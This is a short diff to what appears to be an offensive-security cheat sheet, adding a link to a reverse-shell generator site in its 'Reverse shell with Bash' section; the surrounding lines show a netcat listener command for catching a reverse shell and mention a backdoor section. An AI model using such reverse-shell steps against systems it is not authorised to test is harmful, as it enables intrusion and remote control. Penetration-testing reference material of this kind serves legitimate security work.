@@ -1499,6 +1499,8 @@ See [6. Backdoors](#backdoor) for a 1-liner to deploy and access a fully functio
 <a id="reverse-shell-bash"></a>
 **5.i.b. Reverse shell with Bash**
 
+Tip: Use [https://www.revshells.com/](https://www.revshells.com/) 👌
+
 Start netcat to listen on port 1524 on your system:
 ```sh
 nc -nvlp 1524
